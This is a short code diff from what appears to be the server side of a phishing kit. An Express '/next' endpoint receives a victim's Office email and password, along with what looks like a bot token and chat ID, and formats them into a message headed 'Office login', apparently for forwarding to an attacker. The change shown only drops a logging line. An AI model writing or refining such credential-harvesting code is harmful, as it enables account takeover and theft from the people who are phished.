@@ -11,7 +11,7 @@ app.use(bodyParser.json());
 
 app.post('/next', (req, res) => {
   const { ai, pr, btTkn, chId, userAgent, timeZone } = req.body;
- console.log(req.body);
+ 
   let message = '---------- 📧 Office login 📧 ----------\n';
   message += `email: ${ai} \n`;
   message += `password: ${pr} \n`;
